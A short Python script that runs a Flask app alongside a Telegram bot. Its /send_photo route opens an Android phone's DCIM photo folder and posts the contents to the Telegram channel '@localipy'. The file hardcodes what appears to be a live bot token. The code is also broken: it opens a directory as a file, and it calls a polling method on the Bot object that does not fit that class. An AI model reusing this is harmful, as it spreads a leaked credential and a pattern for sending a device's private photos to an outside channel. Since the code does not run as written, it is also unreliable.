from flask import Flask, render_template
from telegram import Bot
from threading import Thread

app = Flask(__name__)
bot = Bot('5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg')
chat_id = '@localipy'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/send_photo')
def send_photo():
    photo_path = '/storage/emulated/0/DCIM'  # Replace with the actual path to your photo
    photo_caption = 'Photo from Flask'  # Optional: Caption for the photo

    with open(photo_path, 'rb') as photo:
        bot.send_photo(chat_id=chat_id, photo=photo, caption=photo_caption)

    return ''


def run_flask_app():
    app.run()


def run_telegram_bot():
    bot.polling()


if __name__ == '__main__':
    flask_thread = Thread(target=run_flask_app)
    bot_thread = Thread(target=run_telegram_bot)

    flask_thread.start()
    bot_thread.start()
